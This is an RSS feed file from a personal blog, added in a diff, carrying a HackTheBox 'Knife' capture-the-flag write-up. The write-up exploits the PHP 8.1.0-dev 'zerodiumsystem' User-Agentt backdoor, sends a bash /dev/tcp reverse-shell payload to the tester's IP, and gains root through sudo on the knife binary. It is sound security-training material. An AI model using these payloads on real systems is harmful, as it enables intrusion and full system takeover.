@@ -1,0 +1,131 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>knife on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/knife/</link>
+    <description>Recent content in knife on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator><atom:link href="https://fahmifj.github.io/tags/knife/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Knife</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-knife/</guid>
+      <description>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. For the root part, the user is allowed to run knife binary as root user. The binary can be abused to run a malicious Ruby code.
+Skills Learned  Using a backdoor from a supply chain attack 😅 Exploiting sudo privilege on knife binary.</description>
+      <content:encoded><![CDATA[<p>Knife hosts a website that is running a hijacked version of PHP in which it contains a remote code execution backdoor. Leveraging this backdoor results in an interactive shell access to the system. For the root part, the user is allowed to run  <code>knife</code> binary as root user. The binary can be abused to run a malicious Ruby code.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Using a backdoor from a supply chain attack 😅</li>
+<li>Exploiting sudo privilege on <code>knife</code> binary.</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>BurpSuite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Performing <code>nmap</code> all TCP scan discovers two open ports, SSH on 22 and an Apache web server on 80. Nothing much to see here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «knife» «10.10.14.117»
+$ fscan 10.10.10.242 knife
+nmap -n -p- --min-rate<span class="o">=</span><span class="m">10000</span> 10.10.10.242 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p 22,80 -sC -sV -oA nmap/10-tcp-allport-knife 10.10.10.242
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-27 10:19 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.242
+Host is up <span class="o">(</span>0.074s latency<span class="o">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title:  Emergent Medical Idea
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 26.44 seconds
+</code></pre></div><blockquote>
+<p>fscan is just my Nmap wrapper to do full scan and immediately run script scan against the discovered ports .</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80----website">TCP 80  - Website</h3>
+<p>With <code>curl</code>, the hosted website shows that it&rsquo;s powered by PHP 8.1.0-dev.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
+$ curl -sI http://10.10.10.242/
+HTTP/1.1 <span class="m">200</span> OK
+Date: Sat, <span class="m">22</span> May <span class="m">2021</span> 21:46:13 GMT
+Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+X-Powered-By: PHP/8.1.0-dev
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div><p>The website only displays some CSS text animation. The available menus aren&rsquo;t clickable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827213646250.png" alt="image-20210827213646250"  /></div>
+</p>
+<p>I did a Gobuster scan but it didn&rsquo;t output any interesting thing.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-james">Shell as james</h3>
+<h4 id="php-rce-backdoor">PHP RCE backdoor</h4>
+<p>Around March 2021, the PHP git server was compromised and two <a href="https://news-web.php.net/php.internals/113838">malicious commit</a> were pushed to the PHP source code. The code from these commits allows an attacker to obtain remote code execution through the HTTP <code>User-Agent</code> header on any website that uses the hijacked version of PHP. In short, it&rsquo;s a backdoor.</p>
+<p>The commits were pushed into the development branch of PHP 8.1. From previous enumeration, the website response with <code>X-Powered-By: PHP/8.1.0-dev</code>. By presuming that the website uses hijacked version of PHP, I can try to send HTTP request with the following HTTP header.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;uname -a&#39;);
+</span></code></pre></div><p>And the web was vulnerable.</p>
+<p><div class="img-container"><img src="imgs/image-20210827224703632.png" alt="image-20210827224703632"  /></div>
+</p>
+<p>Now to get reverse shell, I can send the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="err">User-Agentt: zerodiumsystem(&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.70/9000 0&gt;&amp;1&#34;&#39;);
+</span></code></pre></div><p>When I send that payload, I have interactive shell access as <strong>james</strong> on my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «knife» «10.10.14.70» 
+$ nc -nvlp <span class="m">9000</span>  
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.70<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.242<span class="o">]</span> <span class="m">48566</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>966<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+james@knife:/$ id
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
+</code></pre></div><p>I also made a script to leverage this backdoor, <a href="https://github.com/fahmifj/php-8.1.0-dev-zerodium-rce">here</a>.</p>
+<h4 id="shell-upgrade">Shell upgrade</h4>
+<p>I will do the PTY trick to upgrade my shell</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+james@knife:/$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+james@knife:/$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> suspended  nc -nvlp <span class="m">9000</span>
+→ root@kali «knife» «10.10.14.70» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">15541</span> continued  nc -nvlp <span class="m">9000</span>
+james@knife:/$ 
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>User <strong>james</strong> is allowed to run <code>knife</code> as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:/opt/chef-workstation/bin$ sudo -l
+Matching Defaults entries <span class="k">for</span> james on knife:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User james may run the following commands on knife:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/knife
+</code></pre></div><h4 id="sudo---knife">Sudo - knife</h4>
+<p><code>knife</code> is a part of <a href="https://www.chef.io/products/chef-infra">Chef</a>, a software for infrastructure management and automation. I&rsquo;m not familiar with that, but according to <a href="https://docs.chef.io/workstation/knife_exec/#examples">this documentation</a>, <code>knife</code> can run a Ruby code or Ruby file script. Therefore, the tool can be abused like this.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">james@knife:~$ sudo knife <span class="nb">exec</span> -E <span class="s2">&#34;exec &#39;/bin/bash&#39;&#34;</span>
+root@knife:/home/james# id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p>Now I can grab the root flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@knife:/home/james# cat /root/root.txt 
+c3744...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://news-web.php.net/php.internals/113838">https://news-web.php.net/php.internals/113838</a></li>
+<li><a href="https://docs.chef.io/workstation/knife_exec/#examples">https://docs.chef.io/workstation/knife_exec/#examples</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
